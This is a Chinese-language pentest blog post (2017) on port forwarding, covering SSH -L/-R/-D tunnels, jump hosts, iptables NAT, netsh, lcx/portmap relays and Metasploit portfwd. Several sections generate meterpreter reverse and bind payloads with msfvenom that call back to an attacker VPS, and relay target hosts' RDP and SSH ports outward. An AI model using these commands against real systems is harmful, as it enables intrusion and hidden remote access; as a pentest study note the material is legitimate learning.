<!DOCTYPE html>
<html>

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>端口转发</title>
    <meta name="description" content="">

    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_8v3czwksspqlg14i.css">
    <link rel="stylesheet" href="/css/main.css ">
    <link rel="canonical" href="http://localhost:4000/2017/11/29/port-forwarding/">
    <link rel="alternate" type="application/rss+xml" title="Jirairya" href="http://localhost:4000/feed.xml ">


    <script>
    // 百度统计代码
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?973906e37cc7bcb6714807627cf64ec6";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
    </script>


    <script>
    // google analytics
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-111240288-1', 'auto');
      ga('send', 'pageview');

    </script>



</head>


  <body>

    <header id="top">
    <div class="wrapper">
        <a href="/" class="brand">Jirairya</a>
        <small></small>
        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
        <nav id="headerNav">
            <ul>
                <li>
                    
                    <a href="/">
                    
                        <i class="fa fa-home"></i>Home
                    </a>
                </li>

                
                    
                    <li>
                        
                        <a href="/archive/">
                        
                            <i class="fa fa-archive"></i>Archives
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/category/">
                        
                            <i class="fa fa-th-list"></i>Categories
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tag/">
                        
                            <i class="fa fa-tags"></i>Tags
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/collections/">
                        
                            <i class="fa fa-folder-open"></i>Collections
                        </a>
                    </li>
                    
                
                    
                
                    
                    <li>
                        
                        <a href="/skills/">
                        
                            <i class="fa fa-bezier-curve"></i>Skills
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tools/">
                        
                            <i class="fa fa-toolbox"></i>Tools
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/about/">
                        
                            <i class="fa fa-paper-plane"></i>About
                        </a>
                    </li>
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
            </ul>
        </nav>
    </div>
</header>


        <div class="page clearfix" post>
    <div class="left">
        <h1>端口转发</h1>
        <div class="label">

            <div class="label-card">
                <i class="fa fa-calendar"></i>2017-11-29
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
            


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#hack" title="Category: hack" rel="category">hack</a>&nbsp;
    
        <a href="/category/#skills" title="Category: skills" rel="category">skills</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


            </div>

            <div class="label-card">
            
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
        <!--a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a-->
        <a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a>&nbsp;
    
        <!--a href="/tag/#skills" title="Tag: skills" rel="tag">skills</a-->
        <a href="/tag/#skills" title="Tag: skills" rel="tag">skills</a>&nbsp;
    
        <!--a href="/tag/#proxy" title="Tag: proxy" rel="tag">proxy</a-->
        <a href="/tag/#proxy" title="Tag: proxy" rel="tag">proxy</a>
    
  

</span>

            </div>

        </div>
        <hr>
        <article itemscope itemtype="http://schema.org/BlogPosting">
        <ul id="markdown-toc">
  <li><a href="#ssh端口转发" id="markdown-toc-ssh端口转发">SSH端口转发</a>    <ul>
      <li><a href="#本地端口转发" id="markdown-toc-本地端口转发">本地端口转发</a>        <ul>
          <li><a href="#本地端口转发详解" id="markdown-toc-本地端口转发详解">本地端口转发详解</a></li>
          <li><a href="#转发例子" id="markdown-toc-转发例子">转发例子</a></li>
        </ul>
      </li>
      <li><a href="#远程端口转发" id="markdown-toc-远程端口转发">远程端口转发</a>        <ul>
          <li><a href="#详解" id="markdown-toc-详解">详解</a></li>
        </ul>
      </li>
      <li><a href="#动态端口转发" id="markdown-toc-动态端口转发">动态端口转发</a></li>
      <li><a href="#链式端口转发" id="markdown-toc-链式端口转发">链式端口转发</a>        <ul>
          <li><a href="#本地端口转发-1" id="markdown-toc-本地端口转发-1">本地端口转发</a></li>
          <li><a href="#跳板" id="markdown-toc-跳板">跳板</a></li>
          <li><a href="#远程端口转发-1" id="markdown-toc-远程端口转发-1">远程端口转发</a></li>
          <li><a href="#总结" id="markdown-toc-总结">总结</a></li>
        </ul>
      </li>
      <li><a href="#msf" id="markdown-toc-msf">MSF</a>        <ul>
          <li><a href="#ssh本地转发" id="markdown-toc-ssh本地转发">ssh本地转发</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#iptables转发" id="markdown-toc-iptables转发">iptables转发</a></li>
  <li><a href="#lcx端口转发" id="markdown-toc-lcx端口转发">lcx端口转发</a>    <ul>
      <li><a href="#windows" id="markdown-toc-windows">windows</a></li>
      <li><a href="#linux" id="markdown-toc-linux">Linux</a></li>
      <li><a href="#meterpreter" id="markdown-toc-meterpreter">meterpreter</a>        <ul>
          <li><a href="#lcx的tran" id="markdown-toc-lcx的tran">lcx的tran</a></li>
          <li><a href="#lcx的listen" id="markdown-toc-lcx的listen">lcx的listen</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#netsh转发只支持tcp协议" id="markdown-toc-netsh转发只支持tcp协议">netsh转发(只支持TCP协议)</a></li>
  <li><a href="#msf的portfwd" id="markdown-toc-msf的portfwd">msf的portfwd</a></li>
  <li><a href="#refer" id="markdown-toc-refer">Refer</a></li>
</ul>
<!--more-->

<h1 id="ssh端口转发">SSH端口转发</h1>

<p>SSH有三种端口转发模式：</p>
<ul>
  <li>本地端口转发</li>
  <li>远程端口转发</li>
  <li>动态端口转发</li>
</ul>

<blockquote>
  <p>本地和远程端口转发，两者的方向相反。动态端口可以科学上网</p>
</blockquote>

<h2 id="本地端口转发">本地端口转发</h2>

<p><strong>本地端口转发：将发送到本地端口的请求，转发到目标端口。通过访问本地端口，访问目标端口的服务。</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> 本地网卡地址:本地端口:目标地址:目标端口 root@远程主机
</code></pre></div></div>

<h3 id="本地端口转发详解">本地端口转发详解</h3>

<ul>
  <li>本地主机A1: SSH客户端</li>
  <li>远程主机B1：SSH服务端
    <ul>
      <li>B1主机的IP为103.59.22.17</li>
      <li>该主机的一个服务端口为3000</li>
    </ul>
  </li>
  <li>主机B2：云主机B1同一内网的主机</li>
</ul>

<p>本地A1登陆云主机B1，将发送到本地主机A1的2000端口 的请求，转发到远程云主机B1的3000端口。在本地A1主机上可以通过访问<code class="highlighter-rouge">127.0.0.1:2000</code>访问云主机B1上的服务。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> localhost:2000:localhost:3000 root@B1
</code></pre></div></div>

<p><code class="highlighter-rouge">-L</code>指定的本地网卡地址可以省略，即<code class="highlighter-rouge">ssh -L localhost:2000:localhost:3000 root@B1</code></p>

<blockquote>
  <p>若本地另一台主机A2能够访问本地主机A1，则A2也可以通过访问A1，访问云主机B1上的服务。</p>
</blockquote>

<hr />

<p><strong><code class="highlighter-rouge">-L</code>的目标地址也可以是其他主机的地址：</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> 2000:B2的IP地址:3000 root@B1云主机的IP地址
</code></pre></div></div>

<blockquote>
  <p>从本地主机A1登陆云主机B1，并进行端口转发。将本地到2000端口的请求转发到主机B2的3000端口上，访问本地主机2000端口就是访问主机B2的3000端口</p>
</blockquote>

<h3 id="转发例子"><a href="http://b404.xyz/2017/11/30/Test-LAB-11/#">转发例子</a></h3>

<p><strong>登陆远程主机<code class="highlighter-rouge">192.168.101.11</code>,并将发送到本地的3389端口的请求转发到<code class="highlighter-rouge">192.168.13.1</code>的3389端口上</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# ssh <span class="nt">-L</span> 3389:192.168.13.1:3389 <span class="nt">-p</span> 2222 <span class="nt">-i</span> ~/Desktop/officetwo.key tech@192.168.101.11
</code></pre></div></div>

<h2 id="远程端口转发">远程端口转发</h2>

<p><strong>远程端口转发：将发送到远程端口的请求，转发到目标端口，这样就可以通过访问远程端口，访问目标端口的服务</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-R</span> 远程网卡地址：远程端口：目标地址：目标端口 root@远程主机
</code></pre></div></div>

<ul>
  <li>本地主机A1: SSH客户端</li>
  <li>远程主机B1：SSH服务端
    <ul>
      <li>B1主机的IP为103.59.22.17</li>
      <li>该主机的一个服务端口为3000</li>
    </ul>
  </li>
  <li>主机A2：局域网本地主机A2</li>
</ul>

<h3 id="详解">详解</h3>

<p>远程端口转发，将发送到远程云主机B1端口3000的请求，转发到本地主机A1的端口2000。这样远程主机B1就可以通过访问本地的<code class="highlighter-rouge">127.0.0.1:3000</code>访问本地主机A1的服务</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-R</span> localhost:3000:localhost:2000 root@远程主机B1
</code></pre></div></div>

<blockquote>
  <p>第一个localhost是云主机B1的localhost，第二个是本地主机A1的的localhost</p>
</blockquote>

<p><code class="highlighter-rouge">-R</code>指定的远程网卡地址可以省略，目标地址可以是其他主机地址。</p>

<p>在本地主机A1上登陆远程云主机B1，并将发送到云主机B1的3000端口的请求，转发到A2的2000端口</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-R</span> 3000:A2的IP地址:2000 root@B1云主机的IP
</code></pre></div></div>

<h2 id="动态端口转发">动态端口转发</h2>

<p><strong>动态端口转发绑定了一个本地端口，而<code class="highlighter-rouge">目标地址：目标端口</code>不固定，<code class="highlighter-rouge">目标地址：目标端口</code>是由发起请求决定</strong></p>

<p>先在终端输入：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -D localhost:9050 root@VPS_IP -p端口
</code></pre></div></div>

<p>在本地主机上发起的请求，转发到远程的VPS上，让VPS真正实现发起的请求</p>

<p>在打开Socks代理，然后直接连接本地的9050端口可以上网：</p>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/ssh/ssh%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91.png" alt="" /></p>

<blockquote>
  <p>若VPS主机3000端口有服务，则在具有socks代理的浏览器就可以进行本地访问<code class="highlighter-rouge">127.0.0.1:3000</code>，实现访问主机的3000端口</p>
</blockquote>

<h2 id="链式端口转发">链式端口转发</h2>

<p><strong>本地端口转发与远程端口转发结合起来使用，可以进行链式转发</strong></p>

<ul>
  <li>A主机：在公司。运行了一个服务</li>
  <li>B主机：在家。</li>
  <li>C主机：远程VPS云主机</li>
</ul>

<blockquote>
  <p>A主机没有独立公共IP地址，且A、B主机不在同一个网络</p>
</blockquote>

<h3 id="本地端口转发-1">本地端口转发</h3>

<p>通过本地端口转发，在A1主机上登陆主机B1，将发送到A1主机的3000端口的请求，转发到B2主机的2000端口上：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> localhost:3000:B2的IP:2000 root@B1的IP
</code></pre></div></div>

<h3 id="跳板">跳板</h3>

<p>将host_middle机器作为跳板机跳转登陆server机器</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-J</span> user1@host_middle_ip user2@server_host_ip
</code></pre></div></div>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/ssh/ssh_J_%E8%B7%B3%E6%9D%BF.png" alt="" /></p>

<h3 id="远程端口转发-1">远程端口转发</h3>

<p>通过远程端口转发，在A1主机上登陆主机B1，将发送到B2主机2000端口的请求，转发到A1主机的3000端口：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-R</span> B2的IP地址:2000:localhost:3000 root@B1的IP
</code></pre></div></div>

<h3 id="总结">总结</h3>

<p>这是redrain大佬所写的<a href="http://128.199.223.185/drops/tips-5234.html">内网渗透随想</a>（http://drops.wooyun.org/tips/5234）：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-qTfnN</span> <span class="nt">-L</span> port:host:host：port <span class="nt">-l</span> user remote_ip   <span class="c">#正向隧道，监听本地port</span>
ssh <span class="nt">-qTfnN</span> <span class="nt">-R</span> port:host:host：port <span class="nt">-l</span> user remote_ip   <span class="c">#反向隧道，用于内网穿透防火墙限制之类</span>
SSH <span class="nt">-qTfnN</span> <span class="nt">-D</span> port remotehost   <span class="c">#直接进行socks代理</span>
</code></pre></div></div>

<p>这是l3m0n师傅的<a href="https://github.com/l3m0n/pentest_study">从零开始内网渗透学习</a>所写：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>本地访问127.0.0.1:port1就是host:port2<span class="o">(</span>用的更多<span class="o">)</span>
ssh <span class="nt">-CfNg</span> <span class="nt">-L</span> port1:127.0.0.1:port2 user@host    <span class="c">#本地转发</span>

访问host:port2就是访问127.0.0.1:port1
ssh <span class="nt">-CfNg</span> <span class="nt">-R</span> port2:127.0.0.1:port1 user@host    <span class="c">#远程转发</span>

可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口
ssh <span class="nt">-qTfnN</span> <span class="nt">-L</span> port:dmz_host:host：port <span class="nt">-l</span> user remote_ip   <span class="c">#正向隧道，监听本地port</span>

可以将dmz_host的hostport端口转发到remote_ip的port端口
ssh <span class="nt">-qTfnN</span> <span class="nt">-R</span> port:dmz_host:host：port <span class="nt">-l</span> user remote_ip   <span class="c">#反向隧道，用于内网穿透防火墙限制之类</span>
</code></pre></div></div>

<blockquote>
  <p>-C 进行数据压缩
-q 安静模式
-T 不占用 shell 了
-f 后台运行，并推荐加上 -n 参数
-N 不执行远程命令，端口转发就用它
-g 允许所有远程主机连接到转发的端口</p>
</blockquote>

<h2 id="msf">MSF</h2>

<h3 id="ssh本地转发">ssh本地转发</h3>

<p>本节方案是 <strong>攻击机器(kali)进行本地端口转发，然后进行正向监听连接转发后的本地端口</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>思路： 
kali进行本地端口转发----&gt;VPS（ssh <span class="nt">-L</span>）
<span class="nt">----------------------------</span>
            |
            |bind_tcp正向连接
            ↓
        目标机器
</code></pre></div></div>

<p>先在kali机器上使用msfvenom生成正向连接的meterpreter：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/meterpreter/bind_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.10.129 <span class="nv">LPORT</span><span class="o">=</span>5454 <span class="nt">-f</span> exe <span class="nt">-o</span> S.exe
</code></pre></div></div>

<blockquote>
  <p>LHOST的10.10.10.129是目标机器的IP</p>
</blockquote>

<p>使用kali上的msfconsole监听：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
</code></pre></div></div>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/ssh/ssh_L_meterpreter_bind_tcp.png" alt="" /></p>

<p>kali进行本地端口转发：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> localhost:1234:被攻击的目标机器:开的meterpreter端口 root@VPS的IP

ssh <span class="nt">-L</span> localhost:1234:10.10.10.129:5454 <span class="nb">test</span>@10.10.10.147
</code></pre></div></div>

<blockquote>
  <p>将到本地1234端口的请求通过vps(10.10.10.147)连接到目标机器的5454端口</p>
</blockquote>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/ssh/ssh_L_meterpreter_bind_tcp_shell.png" alt="" /></p>

<p>=============================================================</p>

<h1 id="iptables转发">iptables转发</h1>

<p>利用linux下的网络防火墙可以进行端口转发。</p>

<ul>
  <li>A ：在家的机器</li>
  <li>B1：公网机器</li>
  <li>B2：公网机器B1所处内网的机器</li>
</ul>

<p>登陆B1机器，在B1主机上先打开IP转发：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>1 <span class="o">&gt;</span> /proc/sys/net/ipv4/ip_forward 
</code></pre></div></div>

<p>在添加NAT规则，并重启iptables：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>service iptables stop
iptables <span class="nt">-t</span> nat <span class="nt">-A</span> PREROUTING <span class="nt">--dst</span> B1主机 <span class="nt">-p</span> tcp <span class="nt">--dport</span> 3306 <span class="nt">-j</span> DNAT <span class="nt">--to-destination</span> B2主机:3307
iptables <span class="nt">-t</span> nat <span class="nt">-A</span> POSTROUTING <span class="nt">--dst</span> B2主机 <span class="nt">-p</span> tcp <span class="nt">--dport</span> 3307 <span class="nt">-j</span> SNAT <span class="nt">--to-source</span> B1主机
service iptables save
service iptables start
</code></pre></div></div>

<hr />

<h1 id="lcx端口转发">lcx端口转发</h1>

<p>lcx端口转发见klionsec师傅的<a href="https://klionsec.github.io/2016/09/09/lcx-porforward/#menu">通向彼岸 之内网代理转发 lcx篇</a>(https://klionsec.github.io/2016/09/09/lcx-porforward/#menu)</p>

<h2 id="windows">windows</h2>

<p>在VPS上执行监听：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lcx <span class="nt">-listen</span> 监听来自外部的某个端口上的流量 转发到指定的本地端口上

lcx <span class="nt">-listen</span> 443 1234 
//监听，把外部到443端口的流量转发到本地的1234端口
</code></pre></div></div>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/lcx%E7%9B%91%E5%90%AC.png" alt="监听" /></p>

<p>然后在目标机器上执行：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lcx <span class="nt">-slave</span> 公网VPS的IP 在VPS上监听的端口  目标机器的IP 目标机器上指定的端口<span class="o">(</span>常为RDP或SSH<span class="o">)</span>

lcx <span class="nt">-slave</span> 103.<span class="k">*</span>.<span class="k">*</span>.<span class="k">*</span> 443 192.168.3.23 3389
//把目标机器的3389端口流量转发到自己VPS的443端口上

lcx <span class="nt">-slave</span> 103.<span class="k">*</span>.<span class="k">*</span>.<span class="k">*</span> 443 192.168.3.23 22
//把目标机器的22端口的流量转发到自己VPS的443端口上
</code></pre></div></div>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/lcx%E8%BD%AC%E5%8F%91.png" alt="" /></p>

<p>最后回到自己的vps上，看到连接正常建立，就可以使用指定工具连接到目标机器上</p>

<h2 id="linux">Linux</h2>

<p>linux版的就是portmap，可<a href="http://b404.xyz/usources/%E5%B7%A5%E5%85%B7/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx.rar">下载</a>进行编译，在linux上实现端口转发。</p>

<p>先在vps上执行：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./lcx <span class="nt">-m</span> 2 <span class="nt">-p1</span> 443 <span class="nt">-h2</span> VPS的IP <span class="nt">-p2</span> 1234

//监听，把外部到443端口的流量转发到本地的1234端口
</code></pre></div></div>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/portmap%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%911.png" alt="" /></p>

<p>到目标机器上执行：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./lcx <span class="nt">-m</span> 3 <span class="nt">-h1</span> 目标机器的IP <span class="nt">-p1</span> 22 <span class="nt">-h2</span> VPS的IP <span class="nt">-p2</span> 443
//把目标机器的22端口转到vps的443端口
</code></pre></div></div>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/portmap%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%913.png" alt="" /></p>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/portmap%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%912.png" alt="" /></p>

<p>最后回到VPS上执行：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh root@127.0.0.1 <span class="nt">-p</span> 1234 
//连接的1234端口实际是目标机器的22端口
</code></pre></div></div>

<h2 id="meterpreter">meterpreter</h2>

<h3 id="lcx的tran">lcx的tran</h3>

<p>把来自公网的meterpreter流量通过VPS转发到本地的MSF中。</p>

<p>首先在VPS上搭建VPN。</p>

<p>现将本地kali连接到VPN内网（VPS搭建的VPN），然后走VPN内网做转发</p>

<p>回到VPS使用ping 测试kali所在VPN内网IP的连通性。</p>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/kali%E8%BF%9E%E6%8E%A5vpn.png" alt="" /></p>

<p>在VPS上做转发，把来自外部到8080端口(一会儿msfvenom生成的payload回连端口)的流量通过VPN内网转发到kali的8080端口上：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lcx -tran 外部端口 指定机器的IP 指定机器上的端口

lcx -tran 8080 kali所处vpn内网IP 8080
</code></pre></div></div>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/lcx_tran.png" alt="" /></p>

<p>确认kali和VPS之间通信没问题之后，回到本地的kali中生成payload（payload回连的IP写VPS的IP）</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="k">*</span>.<span class="k">*</span>.<span class="k">*</span>.<span class="k">*</span><span class="o">[</span>payload的回连ip要设成vps的] <span class="nv">LPORT</span><span class="o">=</span>8080 <span class="nt">-f</span> exe <span class="nt">-o</span> /root/Desktop/shell.exe
</code></pre></div></div>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/msfvenom.png" alt="" /></p>

<p>paylaod生成之后，开始监听：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf <span class="o">&gt;</span> use exploit/multi/handler 
msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 本机的vpn内网IP 
msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lport 8080
msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> exploit <span class="nt">-j</span>
</code></pre></div></div>
<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/msf.png" alt="" /></p>

<p>在目标执行paylaod，meterpreter从公网正常弹回来</p>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/sessions.png" alt="" /></p>

<h3 id="lcx的listen">lcx的listen</h3>

<p>先使用msfvenom生成反向连接的meterpreter，LHOST填写vps的地址：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=VPS的IP LPORT=5353 -f exe -o Fuck.exe
</code></pre></div></div>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/msfvenom_listen.png" alt="" /></p>

<p>在vps上使用lcx进行本地端口转发：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lcx <span class="nt">-listen</span> 5353<span class="o">(</span>meterpreter反弹的端口<span class="o">)</span> 1234
</code></pre></div></div>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/lcx_listen_msf.png" alt="" /></p>

<p>在本地的kali机器上设置监听，并正向连接vps上转发的端口：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf <span class="o">&gt;</span> use exploit/multi/handler 

msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/bind_tcp
payload <span class="o">=&gt;</span> windows/meterpreter/bind_tcp

msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOST VPS的IP
RHOST <span class="o">=&gt;</span> 10.10.10.171

msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT VPS上转发后的端口
LPORT <span class="o">=&gt;</span> 1234
</code></pre></div></div>

<p>在目标机器上运行meterpreter，本地msf就能正常连接反弹的meterpreter。</p>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/lcx/meterpreter_lcx.png" alt="" /></p>

<hr />

<h1 id="netsh转发只支持tcp协议">netsh转发(只支持TCP协议)</h1>

<p>netsh转发见<a href="http://aofengblog.blog.163.com/blog/static/631702120148573851740/">在windows上用netsh动态配置端口转发</a></p>

<p>设置转发规则：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh interface portproxy <span class="nb">set </span>v4tov4 <span class="nv">listenaddress</span><span class="o">=</span>192.168.200.20 <span class="nv">listenport</span><span class="o">=</span>3388 <span class="nv">connectaddress</span><span class="o">=</span>192.168.200.10 <span class="nv">connectport</span><span class="o">=</span>3389
</code></pre></div></div>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/netsh/netsh%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.png" alt="" /></p>

<p>删除转发规则：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh interface portproxy delete v4tov4 <span class="nv">listenaddress</span><span class="o">=</span>192.168.200.20 <span class="nv">listenport</span><span class="o">=</span>3388
</code></pre></div></div>

<p><img src="/img/hack/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/netsh/netsh%E5%88%A0%E9%99%A4%E8%BD%AC%E5%8F%91%E8%A7%84%E5%88%99.png" alt="删除" /></p>

<h1 id="msf的portfwd">msf的portfwd</h1>

<p>得到meterpreter之后，进行portfwd,将<code class="highlighter-rouge">192.168.200.20</code>的3389端口转发到本地的4568端口：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> portfwd add <span class="nt">-l</span> 4568 192.168.200.20 <span class="nt">-p</span> 3389  
</code></pre></div></div>

<h1 id="refer">Refer</h1>

<ul>
  <li><a href="https://blog.fundebug.com/2017/04/24/ssh-port-forwarding/">玩转SSH端口转发</a>:https://blog.fundebug.com/2017/04/24/ssh-port-forwarding/</li>
  <li><a href="https://my.oschina.net/whp/blog/157214">linux端口映射</a>:https://my.oschina.net/whp/blog/157214</li>
  <li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html">实战 SSH 端口转发</a>:https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html</li>
  <li><a href="https://en.m.wikibooks.org/wiki/OpenSSH/Cookbook/Proxies_and_Jump_Hosts">Proxies_and_Jump_Hosts</a>:https://en.m.wikibooks.org/wiki/OpenSSH/Cookbook/Proxies_and_Jump_Hosts</li>
  <li><a href="http://128.199.223.185/drops/tips-5234.html">内网渗透随想</a>:http://drops.wooyun.org/tips/5234</li>
  <li><a href="https://github.com/l3m0n/pentest_study">从零开始内网渗透学习</a>:https://github.com/l3m0n/pentest_study</li>
  <li><a href="http://staff.washington.edu/corey/fw/ssh-port-forwarding.html">SSH Port Forwarding&gt;</a>:http://staff.washington.edu/corey/fw/ssh-port-forwarding.html</li>
  <li><a href="https://klionsec.github.io/2016/09/09/lcx-porforward/#menu">通向彼岸 之内网代理转发 lcx篇</a>(https://klionsec.github.io/2016/09/09/lcx-porforward/#menu)</li>
</ul>

        </article>
        <hr>

        
        
            
            
                
                    
                        
                        <h2 id="similar_posts">Similar Posts</h2>
                        <ul>
                        
                        <li class="relatedPost">
                            <a href="/2018/02/08/Shodan-Manual/">Shodan手册
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
